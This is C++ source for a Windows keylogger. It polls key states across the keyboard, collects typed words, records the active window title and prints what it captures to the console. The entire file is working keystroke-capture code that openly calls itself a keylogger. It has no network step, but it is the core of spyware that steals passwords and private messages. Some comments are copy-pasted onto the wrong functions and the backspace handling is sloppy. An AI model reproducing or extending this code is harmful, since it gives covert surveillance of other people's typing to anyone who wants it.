#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <functional>
#include <atlstr.h>
#include <locale>
#include <codecvt>


bool IsSpecialKey(int S_Key) {
    switch (S_Key)
    {
        case '¾': 
        case VK_SHIFT:
        case VK_RBUTTON:
        case VK_CAPITAL:
        case VK_CONTROL:
        case VK_MENU:
            return true;
        default:
            return false;
    }
}

/*
* Return the current pressed key or null
*/
class KeyLogger {
    /*
    * All the words written by the user.
    */
    // public: static std::vector<std::string> words;
    /*
    * Start the KeyLogger loop.
    */
public: static void start(void(*charCallback)(char), const std::function<void(std::string)>& wordCallback)
    {
        std::string word;
        while (true) {
            Sleep(10);
            char character = KeyLogger::catchChar();
            if (isWordEnder((int) character)) {
                wordCallback(word);
                word = "";
                continue;
            }
            if (character != NULL) {
                if ((int)character == VK_BACK) word.pop_back();
                else {
                    word = word + character;
                    charCallback(character);
                }
            }
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static bool isWordEnder(int character)
    {
        switch (character)
        {
            case VK_RETURN:
            case VK_SPACE:
            case VK_TAB:
            case VK_UP:
            case VK_DOWN:
            case VK_LEFT:
            case VK_RIGHT:
                return true;
            default:
                return false;
        }
    }
    /*
    * Return the current pressed key or null
    */
    public: static char catchChar()
    {
        char KEY = 'x';
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            if (GetAsyncKeyState(KEY) == -32767 && !IsSpecialKey(KEY)) return char(KEY);
        }
        return NULL;
    }
    /*
    * Return the current pressed key or null
    */
    public: static void forEachChar(void(*callback)(char))
    {
        KeyLogger::start(callback, [](std::string s) {});
    }
    /*
    * Return the current pressed key or null
    */
    public: static void forEachWord(const std::function<void(std::string)>& callback)
    {
        KeyLogger::start([](char c){}, callback);
    }
};

std::wstring s2ws(const std::string& str)
{
    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;

    return converterX.from_bytes(str);
}

std::string ws2s(const std::wstring& wstr)
{
    using convert_typeX = std::codecvt_utf8<wchar_t>;
    std::wstring_convert<convert_typeX, wchar_t> converterX;
    return converterX.to_bytes(wstr);
}


std::string GetActiveWindowTitle()
{
    //LPSTR wnd_title;
    char wnd_title[256];
    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
    GetWindowTextA(hwnd, wnd_title, sizeof(wnd_title));
    std::string name = wnd_title;
    return name;
}

int main()
{
    std::vector<std::string> words;
    std::cout << GetActiveWindowTitle();
    // for (const auto& value: words) std::cout << value + char(VK_SPACE);
    KeyLogger::forEachWord([&words](std::string word) {
        words.push_back(word);
        std::cout << word ;
    });
    return 0;
}
